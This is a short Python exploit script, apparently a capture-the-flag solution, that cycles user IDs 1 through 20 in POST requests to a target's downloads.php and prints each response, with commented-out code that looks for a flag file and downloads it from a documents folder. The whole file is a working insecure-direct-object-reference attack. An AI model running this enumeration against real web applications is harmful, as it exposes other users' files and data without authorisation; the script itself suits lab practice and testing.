#!/usr/bin/python3

import re
import requests
import os
import sys
import time
from bs4 import BeautifulSoup as bf


def implementing_exploit(url, uid):
    params = {
        "uid": str(uid)
    }
    res = requests.post(url=f"{url}/downloads.php", data=params).text
    print(res)
    # flag = re.search(r'flag.*.txt', res)
    # if flag is not None:
    #     print(flag.group())
    #     print(requests.get(url=f"{url}/documents/{flag.group()}").text)


def main():
    try:
        url = sys.argv[1]

        for x in range(1, 21):
            implementing_exploit(url, x)
    except Exception as e:
        print(f"[x] Error: {str(e)}")
    except KeyboardInterrupt:
        print("[x] Exiting")
        exit(0)


if __name__ == "__main__":
    main()
